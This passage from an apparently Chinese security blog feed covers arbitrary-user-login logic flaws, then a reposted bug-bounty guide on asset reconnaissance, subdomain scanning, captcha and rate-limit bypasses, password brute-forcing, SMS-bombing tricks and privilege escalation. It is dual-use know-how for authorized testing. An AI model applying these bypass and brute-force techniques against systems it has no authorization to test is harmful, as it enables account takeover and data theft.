<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f25971001b760f531bbb9b0c11655940e750b31e22060.jpg" title="image-20231026103900241" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f25971001b760f531bbb9b0c11655940e750b31e22060.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f3421878f82ea6d3399fbeb79b5993d541a1689fa306d.jpg" title="image-20231026103943886" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f3421878f82ea6d3399fbeb79b5993d541a1689fa306d.jpg">
        
    </a></p>
<h4 id="222-弱cookie" class="headerLink">
    <a href="#222-%e5%bc%b1cookie" class="header-mark"></a>2.2.2 弱cookie</h4><p>系统使用cookie认证，且cookie字段可伪造</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f343545db5d56506f6e6a71bf07fac703d138dbcfc2a7.jpg" title="image-20231026170524323" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f343545db5d56506f6e6a71bf07fac703d138dbcfc2a7.jpg">
        
    </a></p>
<h3 id="23-凭证过早返回" class="headerLink">
    <a href="#23-%e5%87%ad%e8%af%81%e8%bf%87%e6%97%a9%e8%bf%94%e5%9b%9e" class="header-mark"></a>2.3 凭证过早返回</h3><p>一般正常的登录流程为服务端校验完用户身份后，返回用户凭证，但某些系统由于登录前会有很多的查询用户信息类的功能请求，经常导致在登录验证前就返回了用户凭证。</p>
<p>某金融项目，输入手机号会先去查询手机号是否为已注册用户，是的话进入用户信息查询的逻辑，再跳转登录。在信息查询的阶段过早返回了sessionid,导致任意用户登录</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f800254e5355b68a543e3ee9e1658501b0859a0d32d17.jpg" title="image-20231026171141852" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f800254e5355b68a543e3ee9e1658501b0859a0d32d17.jpg">
        
    </a></p>
<h2 id="3逻辑漏洞导致的任意用户登录" class="headerLink">
    <a href="#3%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>3.逻辑漏洞导致的任意用户登录</h2><h3 id="31-登录完全依赖数据包中的参数且参数可控" class="headerLink">
    <a href="#31-%e7%99%bb%e5%bd%95%e5%ae%8c%e5%85%a8%e4%be%9d%e8%b5%96%e6%95%b0%e6%8d%ae%e5%8c%85%e4%b8%ad%e7%9a%84%e5%8f%82%e6%95%b0%e4%b8%94%e5%8f%82%e6%95%b0%e5%8f%af%e6%8e%a7" class="header-mark"></a>3.1 登录完全依赖数据包中的参数且参数可控</h3><p>最常规的任意用户登录漏洞，常见于两步/多步登录的登录逻辑处</p>
<p>以两步登录为例，登录输入账号密码/手机号验证码/其他的凭证信息后第一个请求校验其正确性后，第二个请求根据后端返回的账号/手机号/用户id等字段去获取用户凭证的登录逻辑。</p>
<p>只要修改第一个请求中的返回包或者修改第二个请求中的字段即可</p>
<h4 id="修改第一个请求的返回包" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e7%ac%ac%e4%b8%80%e4%b8%aa%e8%af%b7%e6%b1%82%e7%9a%84%e8%bf%94%e5%9b%9e%e5%8c%85" class="header-mark"></a>修改第一个请求的返回包</h4><p>当请求字段加密时，此方法非常便捷</p>
<p>以下为例</p>
<p>分析登录流程为，第一个请求请求微信接口获取用户手机号，返回到一个请求的返回包中</p>
<p>第二个请求获取返回包中的手机号加密发给服务端，返回其登录凭证</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f76774979cb77858123a944c51b566d6ecc4a6459bdd3.jpg" title="image-20231026175959686" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f76774979cb77858123a944c51b566d6ecc4a6459bdd3.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f176433269fbc7fa524a4ec02bd5b970f940e0b0d8cc6.jpg" title="image-20231026180521839" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f176433269fbc7fa524a4ec02bd5b970f940e0b0d8cc6.jpg">
        
    </a></p>
<p>所以此处只需要替换第一个请求包的返回包中的手机号即可</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f177451e5ce45cf31ffd4eb5e0b7892c28fa428acdc03.jpg" title="image-20231026180607177" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f177451e5ce45cf31ffd4eb5e0b7892c28fa428acdc03.jpg">
        
    </a></p>
<h4 id="修改第二个请求的请求包" class="headerLink">
    <a href="#%e4%bf%ae%e6%94%b9%e7%ac%ac%e4%ba%8c%e4%b8%aa%e8%af%b7%e6%b1%82%e7%9a%84%e8%af%b7%e6%b1%82%e5%8c%85" class="header-mark"></a>修改第二个请求的请求包</h4><p>如下登录数据包，直接更改其中手机号即可</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f47908133233caa9edcbe17466a28a602a913d87212a1.jpg" title="image-20231026181117618" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f47908133233caa9edcbe17466a28a602a913d87212a1.jpg">
        
    </a></p>
<h3 id="32-更改登录type" class="headerLink">
    <a href="#32-%e6%9b%b4%e6%94%b9%e7%99%bb%e5%bd%95type" class="header-mark"></a>3.2 更改登录type</h3><p>部分系统有免密登录/快捷登录之类的功能，只要一个账号就能登录，当遇到登录数据包中含有type之类的字段时，可以尝试此方法</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f376579a190ac9b62ccdbedbb53ee6f9fd7aaeabe7d9c.jpg" title="image-20231026183616031" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f376579a190ac9b62ccdbedbb53ee6f9fd7aaeabe7d9c.jpg">
        
    </a></p>
<h3 id="33-账号数据覆盖" class="headerLink">
    <a href="#33-%e8%b4%a6%e5%8f%b7%e6%95%b0%e6%8d%ae%e8%a6%86%e7%9b%96" class="header-mark"></a>3.3 账号数据覆盖</h3><p>常见于用账号信息更新处，例如修改手机号、账户重新绑定功能、修改账号等功能点处</p>
<p>以修改手机号为例，此处修改需要输入新手机号与新手机号的验证码</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f577428b15ded18a8dd0cb84e3fa4875ee4514325a601.jpg" title="image-20231026104342413" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f577428b15ded18a8dd0cb84e3fa4875ee4514325a601.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f9769675e17c3e4dc7fa3d6ab35702169fe922bbb9033.jpg" title="image-20231026104439045" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f9769675e17c3e4dc7fa3d6ab35702169fe922bbb9033.jpg">
        
    </a></p>
<p>修改请求中的oldmobile字段为其他手机号，成功将其他用户的账户数据覆盖到新手机号中，达到任意用户登录</p>]]></description>
</item><item>
    <title>SRC混子的漏洞挖掘之道</title>
    <link>https://www.bysec.cn/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</link>
    <pubDate>Thu, 30 Nov 2023 09:06:55 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8501</a></em></p>
</blockquote>
<p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p>
<h3 id="前期信息收集" class="headerLink">
    <a href="#%e5%89%8d%e6%9c%9f%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>前期信息收集</h3><p>还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p>
<h4 id="企业相关信息收集" class="headerLink">
    <a href="#%e4%bc%81%e4%b8%9a%e7%9b%b8%e5%85%b3%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>企业相关信息收集</h4><ul>
<li>
<p>企查查 (<a href="https://www.qcc.com" target="_blank" rel="noopener noreferrer">https://www.qcc.com）</a>/)</p>
</li>
<li>
<p>天眼查(<a href="https://www.tianyancha.com/" target="_blank" rel="noopener noreferrer">https://www.tianyancha.com/</a>)</p>
</li>
<li>
<p>启信宝（<a href="https://www.qixin.com/" target="_blank" rel="noopener noreferrer">https://www.qixin.com/</a>)</p>
<p>企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p>
</li>
</ul>
<p><strong>主要查询的信息:</strong></p>
<ol>
<li>一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。</li>
<li>查看同电话企业基本都是子公司。</li>
<li>查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。</li>
<li>查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</li>
</ol>
<p>PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。</p>
<ul>
<li>站长之家:<a href="http://whois.chinaz.com/" target="_blank" rel="noopener noreferrer">http://whois.chinaz.com/</a>
<ul>
<li>邮箱反查、注册人反查、电话反查。</li>
<li>推荐个项目:<a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener noreferrer">https://github.com/code-scan/BroDomain</a> 兄弟域名查询。</li>
</ul>
</li>
<li><a href="https://www.qimai.cn/" target="_blank" rel="noopener noreferrer">https://www.qimai.cn/</a>
<ul>
<li>七麦数据，可以查到企业下一些比较冷门的app。</li>
</ul>
</li>
</ul>
<p><strong>信息整理</strong></p>
<p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息</p>
<ul>
<li>主公司及分公司、子公司下所有归属的网站域名信息；</li>
<li>主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。</li>
<li>主公司及分公司、子公司下所有的app资产和微信小程序。</li>
</ul>
<p>之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p>
<h4 id="子域名收集和网站信息收集" class="headerLink">
    <a href="#%e5%ad%90%e5%9f%9f%e5%90%8d%e6%94%b6%e9%9b%86%e5%92%8c%e7%bd%91%e7%ab%99%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>子域名收集和网站信息收集</h4><p>子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。</p>
<h5 id="通过github收集子域名" class="headerLink">
    <a href="#%e9%80%9a%e8%bf%87github%e6%94%b6%e9%9b%86%e5%ad%90%e5%9f%9f%e5%90%8d" class="header-mark"></a>通过github收集子域名</h5><p>先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。</p>
<h5 id="oneforall" class="headerLink">
    <a href="#oneforall" class="header-mark"></a>oneforAll</h5><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreferrer">https://github.com/shmilylty/OneForAll</a></p>
<ul>
<li>需要到配置文件里填写api接口信息，</li>
<li>根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。</li>
</ul>
<p>命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python oneforall.py --targets ./domain.txt run
</span></span><span class="line"><span class="cl">python oneforall.py --targets ./domain.txt  --brute true run
</span></span></code></pre></td></tr></table>
</div>
</div><p>我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。</p>
<h5 id="xray" class="headerLink">
    <a href="#xray" class="header-mark"></a>xray</h5><p>子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，</p>
<p><a href="https://github.com/timwhitez/rad-xray" target="_blank" rel="noopener noreferrer">https://github.com/timwhitez/rad-xray</a> 命令改一下能批量探测子域名，一般5到10分钟一个子域。</p>
<h5 id="goby" class="headerLink">
    <a href="#goby" class="header-mark"></a>Goby</h5><p>官网:<a href="https://gobies.org/" target="_blank" rel="noopener noreferrer">https://gobies.org/</a></p>
<p>因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener noreferrer">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。</p>
<h5 id="bbscan" class="headerLink">
    <a href="#bbscan" class="header-mark"></a>BBScan</h5><p>猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。</p>
<p>项目地址:</p>
<p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/BBScan</a></p>
<p><a href="https://github.com/yhy0/BBScan" target="_blank" rel="noopener noreferrer">https://github.com/yhy0/BBScan</a> （添加了springboot的泄露探测）</p>
<ul>
<li>可以对域名、ip、C段进行探测</li>
<li>快速探测管理后台</li>
<li>进行端口探测</li>
<li>探测敏感信息泄露</li>
<li>可以自定义扫描规则</li>
</ul>
<p>report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。</p>
<h5 id="js信息收集" class="headerLink">
    <a href="#js%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>js信息收集</h5><p>主要是爬取网站的敏感js文件，js中能收集到的信息:</p>
<ul>
<li>增加攻击面(url、域名)</li>
<li>敏感信息(密码、API密钥、加密方式)</li>
<li>代码中的潜在危险函数操作</li>
<li>具有已知漏洞的框架</li>
</ul>
<p>常用的工具</p>
<p>速度很快的jsfinder <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener noreferrer">https://github.com/Threezh1/JSFinder</a></p>
<p>xray的rad爬虫 <a href="https://github.com/chaitin/rad" target="_blank" rel="noopener noreferrer">https://github.com/chaitin/rad</a></p>
<p>能够匹配敏感信息的JSINFO-SCAN：<a href="https://github.com/p1g3/JSINFO-SCAN" target="_blank" rel="noopener noreferrer">https://github.com/p1g3/JSINFO-SCAN</a></p>
<h3 id="捡中低危漏洞的一些技巧" class="headerLink">
    <a href="#%e6%8d%a1%e4%b8%ad%e4%bd%8e%e5%8d%b1%e6%bc%8f%e6%b4%9e%e7%9a%84%e4%b8%80%e4%ba%9b%e6%8a%80%e5%b7%a7" class="header-mark"></a>捡中低危漏洞的一些技巧</h3><p>刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">框架注入
</span></span><span class="line"><span class="cl"> 明文密码传输
</span></span><span class="line"><span class="cl"> 表单破解漏洞
</span></span><span class="line"><span class="cl"> IIS短文件名泄露
</span></span><span class="line"><span class="cl"> 老旧过期的HTTPS服务
</span></span><span class="line"><span class="cl"> 跨目录下载漏洞
</span></span><span class="line"><span class="cl"> 目录可浏览漏洞
</span></span><span class="line"><span class="cl"> LFI本地文件包含漏洞
</span></span><span class="line"><span class="cl"> RFI远程文件包含漏洞
</span></span><span class="line"><span class="cl"> HTTP拒绝服务攻击
</span></span><span class="line"><span class="cl"> 弱口令登录
</span></span><span class="line"><span class="cl"> CSRF跨站点请求伪造
</span></span><span class="line"><span class="cl"> Flash点击劫持
</span></span><span class="line"><span class="cl"> SQL注入漏洞
</span></span><span class="line"><span class="cl"> XSS跨站脚本漏洞
</span></span><span class="line"><span class="cl"> 文件上传漏洞
</span></span><span class="line"><span class="cl"> 解析漏洞:IIS解析漏洞
</span></span><span class="line"><span class="cl"> 解析漏洞:Apache解析漏洞
</span></span><span class="line"><span class="cl"> Cookies注入漏洞
</span></span><span class="line"><span class="cl"> 越权访问漏洞
</span></span><span class="line"><span class="cl"> 命令执行漏洞
</span></span><span class="line"><span class="cl"> Struts2远程代码执行漏洞
</span></span><span class="line"><span class="cl"> 业务逻辑漏洞
</span></span><span class="line"><span class="cl"> 用户隐私泄露
</span></span><span class="line"><span class="cl"> 敏感信息泄漏(运维)
</span></span><span class="line"><span class="cl"> 敏感信息泄漏(研发)
</span></span><span class="line"><span class="cl"> 敏感文件泄漏(运维)(配置)
</span></span><span class="line"><span class="cl"> 敏感文件泄漏(运维)(权限)
</span></span><span class="line"><span class="cl"> 未验证的重定向和传递
</span></span><span class="line"><span class="cl"> Flash跨域访问资源
</span></span><span class="line"><span class="cl"> 测试文件泄漏
</span></span><span class="line"><span class="cl"> 开启危险的HTTP方法
</span></span><span class="line"><span class="cl"> HTTP参数污染
</span></span><span class="line"><span class="cl"> Unicode编码绕过
</span></span><span class="line"><span class="cl"> 源码泄漏
</span></span><span class="line"><span class="cl"> 后台目录泄漏
</span></span><span class="line"><span class="cl"> 链接注入漏洞
</span></span><span class="line"><span class="cl"> SSRF服务器请求伪造
</span></span><span class="line"><span class="cl"> jsonp劫持
</span></span></code></pre></td></tr></table>
</div>
</div><p>学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。</p>
<ul>
<li>乌云漏洞库:<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener noreferrer">https://wooyun.x10sec.org/</a></li>
<li>hackone报告：<a href="https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA" target="_blank" rel="noopener noreferrer">https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA</a> 提取码:2klt</li>
</ul>
<p>这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。</p>
<h4 id="登录框处常见的一些漏洞" class="headerLink">
    <a href="#%e7%99%bb%e5%bd%95%e6%a1%86%e5%a4%84%e5%b8%b8%e8%a7%81%e7%9a%84%e4%b8%80%e4%ba%9b%e6%bc%8f%e6%b4%9e" class="header-mark"></a>登录框处常见的一些漏洞</h4><p>在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。</p>
<p><strong>现在还能用的接码平台:</strong></p>
<ul>
<li><a href="http://www.114sim.com/" target="_blank" rel="noopener noreferrer">http://www.114sim.com/</a></li>
<li><a href="https://yunduanxin.net/China-Phone-Number/" target="_blank" rel="noopener noreferrer">https://yunduanxin.net/China-Phone-Number/</a></li>
<li><a href="https://www.materialtools.com/" target="_blank" rel="noopener noreferrer">https://www.materialtools.com/</a></li>
</ul>
<h5 id="绕过限制导致的爆破撞库用户遍历漏洞" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e9%99%90%e5%88%b6%e5%af%bc%e8%87%b4%e7%9a%84%e7%88%86%e7%a0%b4%e6%92%9e%e5%ba%93%e7%94%a8%e6%88%b7%e9%81%8d%e5%8e%86%e6%bc%8f%e6%b4%9e" class="header-mark"></a>绕过限制导致的爆破、撞库、用户遍历漏洞</h5><p>最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:</p>
<ul>
<li>验证码不刷新</li>
<li>验证码抓包绕过</li>
<li>验证码删除绕过</li>
<li>验证码置空绕过</li>
<li>修改xff头绕过:推荐个burp插件,<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener noreferrer">https://github.com/TheKingOfDuck/burpFakeIP</a></li>
<li>账号后加空格绕过账号错误次数限制。</li>
</ul>
<p>一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。</p>
<h5 id="弱口令漏洞" class="headerLink">
    <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4%e6%bc%8f%e6%b4%9e" class="header-mark"></a>弱口令漏洞</h5><p><strong>没有验证码或者验证码可以绕过的情况</strong></p>
<p>直接上一手字典爆破，当然还是有一些小技巧:</p>
<ul>
<li>
<p>比如可以设置固定的弱密码，比如123456，然后爆破账号。</p>
</li>
<li>
<p>比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool" target="_blank" rel="noopener noreferrer">https://github.com/HongLuDianXue/BaiLu-SED-Tool</a></p>
</li>
</ul>
<p>爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:</p>
<ul>
<li><a href="https://xz.aliyun.com/t/7823" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/7823</a></li>
<li><a href="https://github.com/huyuanzhi2/password_brute_dictionary" target="_blank" rel="noopener noreferrer">https://github.com/huyuanzhi2/password_brute_dictionary</a></li>
</ul>
<p><strong>有验证码且无法绕过的情况</strong></p>
<ul>
<li>
<p>github直接找员工账号邮箱，密码。</p>
</li>
<li>
<p>源码或者js文件查找线索，邮箱，或者加密的账号密码。</p>
</li>
<li>
<p>特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。</p>
</li>
<li>
<p>手动尝试常见弱口令。</p>
</li>
</ul>
<h5 id="注册登录找回密码处的短信邮箱轰炸漏洞" class="headerLink">
    <a href="#%e6%b3%a8%e5%86%8c%e7%99%bb%e5%bd%95%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81%e5%a4%84%e7%9a%84%e7%9f%ad%e4%bf%a1%e9%82%ae%e7%ae%b1%e8%bd%b0%e7%82%b8%e6%bc%8f%e6%b4%9e" class="header-mark"></a>注册、登录、找回密码处的短信\邮箱轰炸漏洞</h5><p>这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:</p>
<ul>
<li>加空格绕过</li>
<li>加任意字母绕过</li>
<li>前面加86绕过</li>
<li>xff头伪造ip绕过</li>
</ul>
<h5 id="逻辑缺陷的导致的任意用户注册登录找回密码漏洞" class="headerLink">
    <a href="#%e9%80%bb%e8%be%91%e7%bc%ba%e9%99%b7%e7%9a%84%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e6%b3%a8%e5%86%8c%e7%99%bb%e5%bd%95%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81%e6%bc%8f%e6%b4%9e" class="header-mark"></a>逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</h5><p>因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候</p>
<p>类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大:</p>
<p><a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/author/yangyangwithgnu</a></p>
<h4 id="常见的信息泄露漏洞" class="headerLink">
    <a href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e6%bc%8f%e6%b4%9e" class="header-mark"></a>常见的信息泄露漏洞</h4><p>敏感信息泄露的范围很广，我认为一般就是两大类，</p>
<ul>
<li>因为配置错误或者管理不当导致的企业内部信息泄露。</li>
<li>因为逻辑缺陷导致的用户资料泄露(遍历)。</li>
</ul>
<h5 id="github导致的信息泄露" class="headerLink">
    <a href="#github%e5%af%bc%e8%87%b4%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>github导致的信息泄露</h5><ul>
<li>
<p>P牛知识星球里分享的github搜索关键词:<a href="https://twitter.com/obheda12/status/1316513838716551169" target="_blank" rel="noopener noreferrer">https://twitter.com/obheda12/status/1316513838716551169</a></p>
</li>
<li>
<p>github子域名监控项目:<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener noreferrer">https://github.com/FeeiCN/GSIL</a></p>
</li>
<li>
<p>常见的泄露内容:</p>
<ul>
<li>员工内部邮箱、登录账号、密码。</li>
<li>企业的一些内部系统域名、ip泄露。</li>
<li>企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。</li>
</ul>
<p>乌云上有一些案例，可以看一看。</p>
</li>
</ul>
<h5 id="配置错误导致的信息泄露" class="headerLink">
    <a href="#%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af%e5%af%bc%e8%87%b4%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>配置错误导致的信息泄露</h5><p>包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。</p>
<p>我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描</p>
<p>比如:</p>
<ul>
<li>备份文件的小字典</li>
<li>springboot泄露的小字典</li>
<li>网站后台的小字典</li>
</ul>
<p>比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。</p>
<p>可视化的比如TEST404系列、御剑扫描器使用体验也不错。</p>
<p>注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。</p>
<h5 id="越权导致的信息泄露" class="headerLink">
    <a href="#%e8%b6%8a%e6%9d%83%e5%af%bc%e8%87%b4%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>越权导致的信息泄露</h5><p>很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。</p>
<p>推荐几个burp插件:</p>
<ul>
<li>
<p>未授权检测： <a href="https://github.com/theLSA/burp-unauth-checker" target="_blank" rel="noopener noreferrer">https://github.com/theLSA/burp-unauth-checker</a></p>
</li>
<li>
<p>敏感参数提取：<a href="https://github.com/theLSA/burp-sensitive-param-extractor" target="_blank" rel="noopener noreferrer">https://github.com/theLSA/burp-sensitive-param-extractor</a></p>
</li>
<li>
<p>信息提取：<a href="https://github.com/theLSA/burp-info-extractor" target="_blank" rel="noopener noreferrer">https://github.com/theLSA/burp-info-extractor</a></p>
</li>
</ul>
<p>插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。</p>
<p><strong>常见的一些越权情况:</strong></p>
<ul>
<li>基于用户ID的越权</li>
<li>基于功能对象ID的越权</li>
<li>基于上传对象ID的越权</li>
<li>基于未授权访问的越权</li>
<li>基于功能地址的越权</li>
<li>基于接口身份的越权</li>
</ul>
<h3 id="其他的owasptop10漏洞" class="headerLink">
